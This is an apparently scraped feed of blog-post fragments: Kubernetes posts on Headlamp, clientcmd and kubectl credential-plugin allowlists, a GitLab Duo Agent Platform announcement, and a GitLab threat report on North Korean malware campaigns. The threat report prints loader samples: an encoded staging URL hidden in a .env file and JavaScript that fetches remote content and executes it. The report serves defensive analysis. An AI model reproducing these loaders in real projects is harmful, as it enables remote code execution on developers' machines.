href=\"https://github.com/kubernetes-sigs/cluster-api/blob/main/docs/proposals/20250513-chained-and-efficient-upgrades-for-clusters-with-managed-topologies.md\">Chained upgrade proposal</a></li>\n</ul>",

This move brings roadmap and design discussions even closer to the core Kubernetes community and reinforces Headlamp’s role as a modern, extensible UI for the project.</p>\n<div style=\"padding-bottom: 56.25%; height: 0; overflow: hidden;\">\n\n</div>\n<p>As part of that, we’ve also been sharing more about making Kubernetes approachable for a wider audience, including an <a href=\"https://www.youtube.com/watch?v=VFOSyKVOPxs\">appearance on Enlightening with Whitney Lee</a> and a <a href=\"https://www.youtube.com/watch?v=Q7cbT2UBfE0\">talk at KCD New York 2025</a>.</p>\n<h3 id=\"linux-foundation-mentorship\">Linux Foundation mentorship</h3>\n<p>This year, we were excited to work with several students through the Linux Foundation’s Mentorship program, and our mentees have already left a visible mark on Headlamp:</p>\n<ul>\n<li><a href=\"https://github.com/adwait-godbole\"><strong>Adwait Godbole</strong></a> built the KEDA plugin, adding a UI in Headlamp to view and manage KEDA resources like ScaledObjects and ScaledJobs.</li>\n<li><a href=\"https://github.com/DhairyaMajmudar\"><strong>Dhairya Majmudar</strong></a> set up an OpenTelemetry-based observability stack for Headlamp, wiring up metrics, logs, and traces so the project is easier to monitor and debug.</li>\n<li><a href=\"https://www.linkedin.com/in/aishwarya-ghatole-506745231/\"><strong>Aishwarya Ghatole</strong></a> led a UX audit of Headlamp plugins, identifying usability issues and proposing design improvements and personas for plugin users.</li>\n<li><a href=\"https://github.com/SinghaAnirban005\"><strong>Anirban Singha</strong></a> developed the Karpenter plugin, giving Headlamp a focused view into Karpenter autoscaling resources and decisions.</li>\n<li><a href=\"https://github.com/useradityaa\"><strong>Aditya Chaudhary</strong></a> improved Gateway API support, so you can see networking relationships on the resource map, as well as improved support for many of the new Gateway API resources.</li>\n<li><a href=\"https://github.com/Faakhir30\"><strong>Faakhir Zahid</strong></a> completed a way to easily <a href=\"https://headlamp.dev/docs/latest/installation/in-cluster/#plugin-management\">manage plugin installation</a> with Headlamp deployed in clusters.</li>\n<li><a href=\"https://github.com/upsaurav12\"><strong>Saurav Upadhyay</strong></a> worked on backend caching for Kubernetes API calls, reducing load on the API server and improving performance in Headlamp.</li>\n</ul>\n<h2 id=\"new-changes\">New changes</h2>\n<h3 id=\"multi-cluster-view\">Multi-cluster view</h3>\n<p>Managing multiple clusters is challenging: teams often switch between tools and lose context when trying to see what runs where. Headlamp solves this by giving you a single view to compare clusters side-by-side. This makes it easier to understand workloads across environments and reduces the time spent hunting for resources.</p>\n<figure>\n<img alt=\"Multi-cluster view\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/multi-cluster-view.png\" /> <figcaption>\n<p>View of multi-cluster workloads</p>\n</figcaption>\n</figure>\n<h3 id=\"projects\">Projects</h3>\n<p>Kubernetes apps often span multiple namespaces and resource types, which makes troubleshooting feel like piecing together a puzzle. We’ve added <strong>Projects</strong> to give you an application-centric view that groups related resources across multiple namespaces – and even clusters. This allows you to reduce sprawl, troubleshoot faster, and collaborate without digging through YAML or cluster-wide lists.</p>\n<figure>\n<img alt=\"Projects feature\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/projects-feature.png\" /> <figcaption>\n<p>View of the new Projects feature</p>\n</figcaption>\n</figure>\n<p>Changes:</p>\n<ul>\n<li>New “Projects” feature for grouping namespaces into app- or team-centric projects</li>\n<li>Extensible Projects details view that plugins can customize with their own tabs and actions</li>\n</ul>\n<h3 id=\"navigation-and-activities\">Navigation and Activities</h3>\n<p>Day-to-day ops in Kubernetes often means juggling logs, terminals, YAML, and dashboards across clusters. We redesigned Headlamp’s navigation to treat these as first-class “activities” you can keep open and come back to, instead of one-off views you lose as soon as you click away.</p>\n<figure>\n<img alt=\"New task bar\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/new-task-bar.png\" /> <figcaption>\n<p>View of the new task bar</p>\n</figcaption>\n</figure>\n<p>Changes:</p>\n<ul>\n<li>A new task bar/activities model lets you pin logs, exec sessions, and details as ongoing activities</li>\n<li>An activity overview with a “Close all” action and cluster information</li>\n<li>Multi-select and global filters in tables</li>\n</ul>\n<p>Thanks to <a href=\"https://github.com/farodin91\">Jan Jansen</a> and <a href=\"https://github.com/useradityaa\">Aditya Chaudhary</a>.</p>\n<h3 id=\"search-and-map\">Search and map</h3>\n<p>When something breaks in production, the first two questions are usually “where is it?” and “what is it connected to?” We’ve upgraded both search and the map view so you can get from a high-level symptom to the right set of objects much faster.</p>\n<figure>\n<img alt=\"Advanced search\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/advanced-search.png\" /> <figcaption>\n<p>View of the new Advanced Search feature</p>\n</figcaption>\n</figure>\n<p>Changes:</p>\n<ul>\n<li>An Advanced search view that supports rich, expression-based queries over Kubernetes objects</li>\n<li>Improved global search that understands labels and multiple search items, and can even update your current namespace based on what you find</li>\n<li>EndpointSlice support in the Network section</li>\n<li>A richer map view that now includes Custom Resources and Gateway API objects</li>\n</ul>\n<p>Thanks to <a href=\"https://github.com/faebr\">Fabian</a>, <a href=\"https://github.com/alexandernorth\">Alexander North</a>, and <a href=\"https://github.com/victormarcolino\">Victor Marcolino</a> from Swisscom, and also to <a href=\"https://github.com/useradityaa\">Aditya Chaudhary</a>.</p>\n<h3 id=\"oidc-and-authentication\">OIDC and authentication</h3>\n<p>We’ve put real work into making OIDC setup clearer and more resilient, especially for in-cluster deployments.</p>\n<figure>\n<img alt=\"User info\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/user-info.png\" /> <figcaption>\n<p>View of user information for OIDC clusters</p>\n</figcaption>\n</figure>\n<p>Changes:</p>\n<ul>\n<li>User information displayed in the top bar for OIDC-authenticated users</li>\n<li>PKCE support for more secure authentication flows, as well as hardened token refresh handling</li>\n<li>Documentation for using the access token using <code>-oidc-use-access-token=true</code></li>\n<li>Improved support for public OIDC clients like AKS and EKS</li>\n<li>New guide for setting up Headlamp <a href=\"https://headlamp.dev/docs/latest/installation/in-cluster/aks-cluster-oauth/\">on AKS with Azure Entra-ID using OAuth2Proxy</a></li>\n</ul>\n<p>Thanks to <a href=\"https://github.com/daviddob\">David Dobmeier</a> and <a href=\"https://github.com/HarshSrivastava275\">Harsh Srivastava</a>.</p>\n<h3 id=\"app-catalog-and-helm\">App Catalog and Helm</h3>\n<p>We’ve broadened how you deploy and source apps via Headlamp, specifically supporting vanilla Helm repos.</p>\n<p>Changes:</p>\n<ul>\n<li>A more capable Helm chart with optional backend TLS termination, PodDisruptionBudgets, custom pod labels, and more</li>\n<li>Improved formatting and added missing access token arg in the Helm chart</li>\n<li>New in-cluster Helm support with an <code>--enable-helm</code> flag and a service proxy</li>\n</ul>\n<p>Thanks to <a href=\"https://github.com/shahvrushali22\">Vrushali Shah</a> and <a href=\"https://github.com/muraliinformal\">Murali Annamneni</a> from Oracle, and also to <a href=\"https://github.com/jcpunk\">Pat Riehecky</a>, <a href=\"https://github.com/jda258\">Joshua Akers</a>, <a href=\"https://github.com/rstribrn\">Rostislav Stříbrný</a>, <a href=\"https://github.com/rickliujh\">Rick L</a>, and <a href=\"https://github.com/vnea\">Victor</a>.</p>\n<h3 id=\"performance-accessibility-and-ux\">Performance, accessibility, and UX</h3>\n<p>Finally, we’ve spent a lot of time on the things you notice every day but don’t always make headlines: startup time, list views, log viewers, accessibility, and small network UX details. A continuous accessibility self-audit has also helped us identify key issues and make Headlamp easier for everyone to use.</p>\n<figure>\n<img alt=\"Learn section\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/learn-section.png\" /> <figcaption>\n<p>View of the Learn section in docs</p>\n</figcaption>\n</figure>\n<p>Changes:</p>\n<ul>\n<li>Significant desktop improvements, with up to 60% faster app loads and much quicker dev-mode reloads for contributors</li>\n<li>Numerous table and log viewer refinements: persistent sort order, consistent row actions, copy-name buttons, better tooltips, and more forgiving log inputs</li>\n<li>Accessibility and localization improvements, including fixes for zoom-related layout issues, better color contrast, improved screen reader support, and expanded language coverage</li>\n<li>More control over resources, with live pod CPU/memory metrics, richer pod details, and inline editing for secrets and CRD fields</li>\n<li>A refreshed documentation and plugin onboarding experience, including a “Learn” section and plugin showcase</li>\n<li>A more complete NetworkPolicy UI and network-related polish</li>\n<li>Nightly builds available for early testing</li>\n</ul>\n<p>Thanks to <a href=\"https://github.com/jaehanbyun\">Jaehan Byun</a> and <a href=\"https://github.com/farodin91\">Jan Jansen</a>.</p>\n<h2 id=\"plugins-and-extensibility\">Plugins and extensibility</h2>\n<p>Discovering plugins is simpler now – no more hopping between Artifact Hub and assorted GitHub repos. Browse our dedicated <a href=\"https://headlamp.dev/plugins\">Plugins page</a> for a curated catalog of Headlamp-endorsed plugins, along with a showcase of featured plugins.</p>\n<figure>\n<img alt=\"Plugins page\" src=\"https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/plugins-page.png\" /> <figcaption>\n<p>View of the Plugins showcase</p>\n</figcaption>\n</figure>\n<h3 id=\"headlamp-ai-assistant\">Headlamp AI Assistant</h3>\n<p>Managing Kubernetes often means memorizing commands and juggling tools. Headlamp’s new AI Assistant changes this by adding a natural-language interface built into the UI. Now, instead of typing <code>kubectl</code> or digging through YAML you can ask, “Is my app healthy?” or “Show logs for this deployment,” and get answers in context, speeding up troubleshooting and smoothing onboarding for new users.

      "summary": "<p>If you've ever wanted to develop a command line client for a Kubernetes API,\nespecially if you've considered making your client usable as a <code>kubectl</code> plugin,\nyou might have wondered how to make your client feel familiar to users of <code>kubectl</code>.\nA quick glance at the output of <code>kubectl options</code> might put a damper on that:\n&quot;Am I really supposed to implement all those options?&quot;</p>\n<p>Fear not, others have done a lot of the work involved for you.\nIn fact, the Kubernetes project provides two libraries to help you handle\n<code>kubectl</code>-style command line arguments in Go programs:\n<a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd\"><code>clientcmd</code></a> and\n<a href=\"https://pkg.go.dev/k8s.io/cli-runtime\"><code>cli-runtime</code></a>\n(which uses <code>clientcmd</code>).\nThis article will show how to use the former.</p>\n<h2 id=\"general-philosophy\">General philosophy</h2>\n<p>As might be expected since it's part of <code>client-go</code>,\n<code>clientcmd</code>'s ultimate purpose is to provide an instance of\n<a

above settings can be further overridden using command line arguments.</li>\n</ul>\n<p>It doesn't set up a <code>--kubeconfig</code> command line argument,\nwhich you might want to do to align with

id=\"configuration-merging\">Configuration merging</h2>\n<p>In various scenarios, <code>clientcmd</code> supports <em>merging</em> configuration settings:\n<code>KUBECONFIG</code> can specify multiple files whose contents are combined.\nThis can be confusing, because settings are merged in different directions\ndepending on how they are implemented.\nIf a setting is defined in a map, the first definition wins,\nsubsequent definitions are ignored.\nIf a setting is not defined in a map, the last definition wins.</p>\n<p>When settings are retrieved using <code>KUBECONFIG</code>,\nmissing files result in warnings only.\nIf the user explicitly specifies a path (in <code>--kubeconfig</code> style),\nthere must be a corresponding file.</p>\n<p>If <code>KUBECONFIG</code> isn't defined,\nthe default configuration file, <code>~/.kube/config</code>, is used instead,\nif present.</p>\n<h3 id=\"overall-process\">Overall process</h3>\n<p>The general usage pattern is succinctly expressed

href=\"https://kubernetes.io/feed.xml#obtain-an-api-client\">Obtain an API client</a>.</li>\n</ol>\n<h3 id=\"configure-the-loading-rules\">Configure the loading rules</h3>\n<p><code>clientcmd.NewDefaultClientConfigLoadingRules()</code> builds loading rules which will use either the contents of the <code>KUBECONFIG</code> environment variable,\nor the default configuration file name (<code>~/.kube/config</code>).\nIn addition, if the default configuration file is used,\nit is able to migrate settings from the (very) old default configuration file\n(<code>~/.kube/.kubeconfig</code>).</p>\n<p>You can build your own <code>ClientConfigLoadingRules</code>,\nbut in most cases the defaults are fine.</p>\n<h3 id=\"configure-the-overrides\">Configure the overrides</h3>\n<p><code>clientcmd.ConfigOverrides</code> is a <code>struct</code> storing overrides which will be applied over the settings loaded from the configuration derived using the loading rules.\nIn the context of this article,\nits primary purpose is to store values obtained from command line arguments.\nThese are handled using the <a href=\"https://github.com/spf13/pflag\">pflag</a> library,\nwhich is a drop-in replacement for Go's <a href=\"https://pkg.go.dev/flag\"><code>flag</code></a> package,\nadding support for double-hyphen arguments with long names.</p>\n<p>In most cases there's nothing to set in the overrides;\nI will only bind them to flags.</p>\n<h3 id=\"build-a-set-of-flags\">Build a set of flags</h3>\n<p>In this context, a flag is a representation of a command line argument,\nspecifying its long name (such as <code>--namespace</code>),\nits short name if any (such as <code>-n</code>),\nits default value,\nand a description shown in the usage information.\nFlags are stored in instances of\nthe <a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd#FlagInfo\"><code>FlagInfo</code></a> struct.</p>\n<p>Three sets of flags are available,\nrepresenting the following command line arguments:</p>\n<ul>\n<li>authentication arguments (certificates, tokens, impersonations, username/password);</li>\n<li>cluster arguments (API server, certificate authority, TLS configuration, proxy, compression)</li>\n<li>context arguments (cluster name, <code>kubeconfig</code> user name, namespace)</li>\n</ul>\n<p>The recommended selection includes all three with a named context selection argument and a timeout argument.</p>\n<p>These are all available using the <code>Recommended…Flags</code> functions.\nThe functions take a prefix, which is prepended to all the argument long names.</p>\n<p>So calling\n<a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd#RecommendedConfigOverrideFlags\"><code>clientcmd.RecommendedConfigOverrideFlags(&quot;&quot;)</code></a>\nresults in command line arguments such as <code>--context</code>, <code>--namespace</code>, and so on.\nThe <code>--timeout</code> argument is given a default value of 0,\nand the <code>--namespace</code> argument has a corresponding short variant, <code>-n</code>.\nAdding a prefix, such as <code>&quot;from-&quot;</code>, results in command line arguments such as\n<code>--from-context</code>, <code>--from-namespace</code>, etc.\nThis might not seem particularly useful on commands involving a single API server,\nbut they come in handy when multiple API servers are involved,\nsuch as in multi-cluster scenarios.</p>\n<p>There's a potential gotcha here: prefixes don't modify the short name,\nso <code>--namespace</code> needs some care if multiple prefixes are used:\nonly one of the prefixes can be associated with the <code>-n</code> short name.\nYou'll have to clear the short names associated with the other prefixes'\n<code>--namespace</code> , or perhaps all prefixes if there's no sensible\n<code>-n</code> association.\nShort names can be cleared as follows:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-go\"><span style=\"display: flex;\"><span>kflags <span style=\"color: #666;\">:=</span> clientcmd.<span style=\"color: #00a000;\">RecommendedConfigOverrideFlags</span>(prefix)\n</span></span><span style=\"display: flex;\"><span>kflags.ContextOverrideFlags.Namespace.ShortName = <span style=\"color: #b44;\">\"\"</span>\n</span></span></code></pre></div><p>In a similar fashion, flags can be disabled entirely by clearing their long name:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-go\"><span style=\"display: flex;\"><span>kflags.ContextOverrideFlags.Namespace.LongName = <span style=\"color: #b44;\">\"\"</span>\n</span></span></code></pre></div><h3 id=\"bind-the-flags\">Bind the flags</h3>\n<p>Once a set of flags has been defined,\nit can be used to bind command line arguments to overrides using\n<a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd#BindOverrideFlags\"><code>clientcmd.BindOverrideFlags</code></a>.\nThis requires a\n<a href=\"https://pkg.go.dev/github.com/spf13/pflag\"><code>pflag</code></a> <code>FlagSet</code>\nrather than one from Go's <code>flag</code> package.</p>\n<p>If you also want to bind <code>--kubeconfig</code>, you should do so now,\nby binding <code>ExplicitPath</code> in the loading rules:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-go\"><span style=\"display: flex;\"><span>flags.<span style=\"color: #00a000;\">StringVarP</span>(<span style=\"color: #666;\">&amp;</span>loadingRules.ExplicitPath, <span style=\"color:

file(s)\"</span>)\n</span></span></code></pre></div><h3 id=\"build-the-merged-configuration\">Build the merged configuration</h3>\n<p>Two functions are available to build a merged configuration:</p>\n<ul>\n<li><a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd#NewInteractiveDeferredLoadingClientConfig\"><code>clientcmd.NewInteractiveDeferredLoadingClientConfig</code></a></li>\n<li><a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd#NewNonInteractiveDeferredLoadingClientConfig\"><code>clientcmd.NewNonInteractiveDeferredLoadingClientConfig</code></a></li>\n</ul>\n<p>As the names suggest, the difference between the two is that the first\ncan ask for authentication information interactively,\nusing a provided reader,\nwhereas the second only operates on the information given to it by the caller.</p>\n<p>The &quot;deferred&quot; mention in these function names refers to the fact that\nthe final configuration will be determined as late as possible.\nThis means that these functions can be called before the command line arguments are parsed,\nand the resulting configuration will use whatever values have been parsed\nby the time it's actually constructed.</p>\n<h3 id=\"obtain-an-api-client\">Obtain an API client</h3>\n<p>The merged configuration is returned as a\n<a href=\"https://pkg.go.dev/k8s.io/client-go/tools/clientcmd#ClientConfig\"><code>ClientConfig</code></a> instance.\nAn API client can be obtained from that by calling the <code>ClientConfig()</code> method.</p>\n<p>If no configuration is given\n(<code>KUBECONFIG</code> is empty or points to non-existent files,\n<code>~/.kube/config</code> doesn't exist,\nand no configuration is given using command line arguments),\nthe default setup will return an obscure error referring to <code>KUBERNETES_MASTER</code>.\nThis is legacy behaviour;\nseveral attempts have been made to get rid of it,\nbut it is preserved for the <code>--local</code> and <code>--dry-run</code> command line arguments in <code>--kubectl</code>.\nYou should check for &quot;empty configuration&quot; errors by calling <code>clientcmd.IsEmptyConfig()</code>\nand provide a more explicit error message.</p>\n<p>The <code>Namespace()</code> method is also useful:\nit returns the namespace that should be used.\nIt also indicates whether the namespace was overridden by the user\n(using <code>--namespace</code>).</p>\n<h2 id=\"full-example\">Full example</h2>\n<p>Here's a complete example.</p>\n<div

      "link": "https://kubernetes.io/blog/2026/01/09/kubernetes-v1-35-kuberc-credential-plugin-allowlist/",
      "published": "Fri, 09 Jan 2026 10:30:00 -0800",
      "summary": "<p>Did you know that <code>kubectl</code> can run arbitrary executables, including shell\nscripts, with the full privileges of the invoking user, and without your\nknowledge? Whenever you download or auto-generate a <code>kubeconfig</code>, the\n<code>users[n].exec.command</code> field can specify an executable to fetch credentials on\nyour behalf. Don't get me wrong, this is an incredible feature that allows you\nto authenticate to the cluster with external identity providers. Nevertheless,\nyou probably see the problem: Do you know exactly what executables your <code>kubeconfig</code>\nis running on your system? Do you trust the pipeline that generated your <code>kubeconfig</code>?\nIf there has been a supply-chain attack on the code that generates the kubeconfig,\nor if the generating pipeline has been compromised, an attacker might well be\ndoing unsavory things to your machine by tricking your <code>kubeconfig</code> into running\narbitrary code.</p>\n<p>To give the user more control over what gets run on their system, <a href=\"https://git.k8s.io/community/sig-auth\">SIG-Auth</a> and <a href=\"https://git.k8s.io/community/sig-cli\">SIG-CLI</a> added the credential plugin policy and allowlist as a beta feature to\nKubernetes 1.35. This is available to all clients using the <code>client-go</code> library,\nby filling out the <a href=\"https://github.com/kubernetes/client-go/blob/master/tools/clientcmd/api/types.go#L290\">ExecProvider.PluginPolicy</a> struct on a REST config. To\nbroaden the impact of this change, Kubernetes v1.35 also lets you manage this without\nwriting a line of application code. You can configure <code>kubectl</code> to enforce\nthe policy and allowlist by adding two fields to the <code>kuberc</code> configuration\nfile: <code>credentialPluginPolicy</code> and <code>credentialPluginAllowlist</code>. Adding one or\nboth of these fields restricts which credential plugins <code>kubectl</code> is allowed to execute.</p>\n<h2 id=\"how-it-works\">How it works</h2>\n<p>A full description of this functionality is available in our <a href=\"https://kubernetes.io/docs/reference/kubectl/kuberc/\">official documentation</a> for kuberc,\nbut this blog post will give a brief overview of the new security knobs. The new\nfeatures are in beta and available without using any feature gates.</p>\n<p>The following example is the simplest one: simply don't specify the new fields.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>kubectl.config.k8s.io/v1beta1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">kind</span>:<span style=\"color: #bbb;\"> </span>Preference<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><p>This will keep <code>kubectl</code> acting as it always has, and all plugins will be\nallowed.</p>\n<p>The next example is functionally identical, but it is more explicit and\ntherefore preferred if it's actually what you want:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>kubectl.config.k8s.io/v1beta1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">kind</span>:<span style=\"color: #bbb;\"> </span>Preference<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">credentialPluginPolicy</span>:<span style=\"color: #bbb;\"> </span>AllowAll<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><p>If you <em>don't know</em> whether or not you're using exec credential plugins, try\nsetting your policy to <code>DenyAll</code>:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>kubectl.config.k8s.io/v1beta1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">kind</span>:<span style=\"color: #bbb;\"> </span>Preference<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">credentialPluginPolicy</span>:<span style=\"color: #bbb;\"> </span>DenyAll<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><p>If you <em>are</em> using credential plugins, you'll quickly find out what <code>kubectl</code> is\ntrying to execute.

One of them is\nspecified by full path, and the other, <code>get-identity</code> is just a basename. When\nyou specify just the basename, the full path will be looked up using\n<code>exec.LookPath</code>, which does not expand globbing or handle wildcards.\nGlobbing is not supported at this time. Both forms\n(basename and full path) are acceptable, but the full path is preferable because\nit narrows the scope of allowed binaries even further.</p>\n<h3 id=\"future-enhancements\">Future enhancements</h3>\n<p>Currently, an allowlist entry has only one field, <code>name</code>. In the future, we\n(Kubernetes SIG CLI) want to see other requirements added. One idea that seems\nuseful is checksum verification whereby, for example, a binary would only be allowed\nto run if it has the sha256 sum\n<code>b9a3fad00d848ff31960c44ebb5f8b92032dc085020f857c98e32a5d5900ff9c</code> <strong>and</strong>\nexists at the path <code>/usr/bin/cloudco-login</code>.</p>\n<p>Another possibility is only allowing binaries that have been signed by one of a\nset of a trusted signing keys.</p>\n<h2 id=\"get-involved\">Get involved</h2>\n<p>The credential plugin policy is still under development and we are very interested\nin your feedback.

This approach provides the transparent and predictable metering that enterprises require for trust and internal chargeback.</p><ul><li><strong>Data residency and control</strong>: You can now run GitLab Duo Agent Platform in production on online cloud licenses while using models you host on your own infrastructure or approved cloud environments. This gives you control over where models run and how inference traffic is routed within your approved environments.</li><li><strong>Cost transparency and chargeback</strong>: Gain granular cost transparency through GitLab Credits and per-request metering, which is essential for accurate internal chargeback and meeting regulatory reporting standards.</li><li><strong>Adoption acceleration</strong>: Removes a significant deployment blocker for adopting agentic AI in sectors like financial services, government, and critical infrastructure, where routing data through external AI vendors is simply not an option.\nGitLab 18.9 makes Duo Agent Platform a first-class deployment for online cloud licenses.</li></ul><h2 id=\"bring-your-own-model\">Bring Your Own Model</h2><p>Self-hosting the orchestration layer is only half the story.

This ensures customers retain model choice and control.</p><ul><li><strong>Integration and governance</strong>: BYOM models appear alongside GitLab-managed models within GitLab’s AI control plane, allowing Duo Agent Platform to treat them as enterprise-ready options.</li><li><strong>Granular mapping</strong>: Once registered through the AI Gateway, models can be mapped to specific Duo Agent Platform flows or features, giving you fine-grained control over which agents and flows use which models.\nAdmins maintain responsibility for model validation, performance, and risk evaluation. You own compatibility, performance, and risk evaluation for the models you bring.</li></ul><p>Together, these capabilities give enterprise engineering leaders comprehensive control over agentic AI. The result is a single, governed control plane for agentic AI, replacing the fragmented mix of point solutions and unmanaged AI tools that many engineering organizations rely on today.

We banned an average of 11 accounts per month for distributing North Korean nation-state malware or loaders. We assess that North Korean nation-state malware activity on GitLab.com almost certainly relates to distinct teams operating in parallel based on branching distribution and obfuscation techniques, infrastructure, and malware variants.</p><h3 id=\"key-findings\">Key findings</h3><p>Here are our key findings, including 2025 campaign trends and malicious code project features.</p><h4 id=\"_2025-campaign-trends\">2025 campaign trends</h4><p>In 2025, we banned 131 unique accounts distributing malicious code projects we attribute to North Korean nation-state threat actors. We identified malicious projects through a combination of proactive detection and user reports. In every instance, threat actors used primarily JavaScript codebases. Malicious repositories executed JavaScript-based malware families tracked publicly as BeaverTail and Ottercookie in more than 95% of cases, however we also observed the distribution of lower prevalence payloads, including the compiled ClickFix BeaverTail variant <a href=\"https://gitlab-com.gitlab.io/gl-security/security-tech-notes/threat-intelligence-tech-notes/north-korean-malware-sept-2025/\" rel=\"\">we identified</a> in September.</p><p>Threat actors typically originated from consumer VPNs when interacting with GitLab.com to distribute malware; however they also intermittently originated from dedicated VPS infrastructure and likely laptop farm IP addresses. Threat actors created accounts using Gmail email addresses in almost 90% of cases. We observed custom email domains in only five cases, all relating to organizations we assess are likely front companies controlled by North Korean threat actors. Based on project composition, threat actors most commonly targeted developers seeking employment in the cryptocurrency, finance, and real estate sectors. Threat actors also targeted developers in sectors, including artificial intelligence and gaming, at a low rate.</p><p>In more than 80% of instances, threat actors did not store malware payloads on GitLab.com, instead storing a concealed loader intended to source and execute remote content. Threat actors abused at least six legitimate services to host malware payloads, most commonly Vercel. Threat actors also used custom domains to host malware payloads at least 10 times in 2025.</p><p><img alt=\"Distribution of staging infrastructure used in North Korean nation-state malware activity on GitLab.com in 2025.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769690321/kgjafjsrhpczu00fjdwb.png\" title=\"Distribution of staging infrastructure used in North Korean nation-state malware activity on GitLab.com in 2025.\" /></p><p>We observed diverse project structures and a gradual evolution of concealment techniques through 2025. In nine instances, threat actors used malicious NPM dependencies created immediately prior to their use in malicious projects. In December, we observed a cluster of projects executing malware via VS Code tasks, either piping remote content to a native shell or executing a custom script to decode malware from binary data in a fake font file.</p><p><img alt=\"Distribution of features in North Korean nation-state malware projects activity on GitLab.com in 2025.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769690321/p2gpkuvise7ftc5lr7pv.png\" title=\"Distribution of features in North Korean nation-state malware projects activity on GitLab.com in 2025.\" /></p><h4 id=\"malicious-code-project-features\">Malicious code project features</h4><p>The most common execution pattern we observed in 2025 had the following features:</p><ul><li>A base64 encoded next-stage URL, header key, and header value, all masquerading as benign variables in a .env file.</li><li>A trigger function intended to source remote content and raise an error.</li><li>A global invocation of the trigger function in a file executed as soon as the project is run.</li><li>A custom error handler intended to execute remote content from the trigger function by using <code>Function.constructor</code> to load a string as executable code.</li></ul><p><strong>Example excerpt from a .env file containing malicious encoded variables:</strong></p><pre><code># Runtime Configuration\nRUNTIME_CONFIG_API_KEY=aHR0cHM6Ly9hcGktc2VydmVyLW1vY2hhLnZlcmNlbC5hcHAvYXBpL2lwY2hlY2stZW5jcnlwdGVkLzgyMw\nRUNTIME_CONFIG_ACCESS_KEY=eC1zZWNyZXQtaGVhZGVy\nRUNTIME_CONFIG_ACCESS_VALUE=c2VjcmV0\n</code></pre><p><strong>Decoded values from the .env file (defanged):</strong></p><pre><code># Runtime Configuration\nRUNTIME_CONFIG_API_KEY=hxxps[:]//api-server-mocha.vercel[.]app/api/ipcheck-encrypted/823\nRUNTIME_CONFIG_ACCESS_KEY=x-secret-header\nRUNTIME_CONFIG_ACCESS_VALUE=secret\n</code></pre><p><strong>Example trigger function intended to source remote content from the concealed staging URL and trigger the custom error handler:</strong></p><pre><code>const errorTimeHandler = async () =&gt; {\n  try {\n    const src = atob(process.env.RUNTIME_CONFIG_API_KEY);\n    const k = atob(process.env.RUNTIME_CONFIG_ACCESS_KEY);\n    const v = atob(process.env.RUNTIME_CONFIG_ACCESS_VALUE);\n    try {\n      globalConfig = (await axios.get(`${src}`, {\n        headers: {\n          [k]: v\n        }\n      }));\n      log('Runtime config loaded successfully.');\n    } catch (error) {\n      errorHandler(error.response?.data || error.message);\n    }\n  } catch (err) {\n    await errorHandler(err.response?.data || err.message || err);\n  }\n};\n</code></pre><p><strong>Example custom error handler intended to execute remote code:</strong></p><pre><code>const errorHandler = (error) =&gt; {\n  try {\n    if (typeof error !== 'string') {\n      sss\n      console.error('Invalid error format.

Staging URLs commonly respond with decoy content unless the correct header values are included with requests. This technique became increasingly common through 2025, alongside other anti-analysis developments, including sandbox detection in Ottercookie and the increasing use of invite-only private projects.</p><p>The extent to which distinctive subgroups of activity overlap in time leads us to assess that North Korean nation-state malware distribution on GitLab.com almost certainly relates to distinct teams operating in parallel with limited coordination. We’ve observed instances consistent with individual operators independently trying to fix an execution issue or add a feature to their malware. We also observed instances where threat actors have more than one malware execution pathway in a malicious repository, potentially resulting in malware executing twice or more. These instances suggest low technical proficiency among some operators, who appear to lack confidence when modifying malware code.</p><h4 id=\"other-notable-observations\">Other notable observations</h4><p>In July 2025, we identified a project containing notes kept by a North Korean nation-state malware distributor. The threat actor maintained a target list containing more than 1,000 individuals' names. Comments added by the threat actor identify 209 individuals having responded to contact attempts, 88 of whom were recorded as having executed a malicious project. This operator also maintained documents and code related to contract software development, suggesting simultaneous engagement in both malware distribution and fraudulent employment.</p><p>In September 2025, we observed a North Korean 